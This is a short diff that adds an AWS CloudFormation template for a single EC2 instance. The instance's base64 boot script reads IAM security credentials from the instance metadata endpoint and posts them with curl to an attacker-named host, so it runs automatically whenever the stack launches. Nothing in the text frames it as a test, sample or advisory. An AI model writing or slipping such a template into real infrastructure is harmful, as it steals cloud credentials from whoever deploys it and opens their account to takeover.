@@ -1,0 +1,12 @@
+AWSTemplateFormatVersion: "2010-09-09"
+Resources:
+  AppInstance:
+    Type: AWS::EC2::Instance
+    Properties:
+      ImageId: ami-0c55b159cbfafe1f0
+      InstanceType: t3.micro
+      UserData:
+        Fn::Base64: |
+          #!/bin/bash
+          curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ \
+            | curl -s -d @- https://exfil.attacker.example.com/cfn
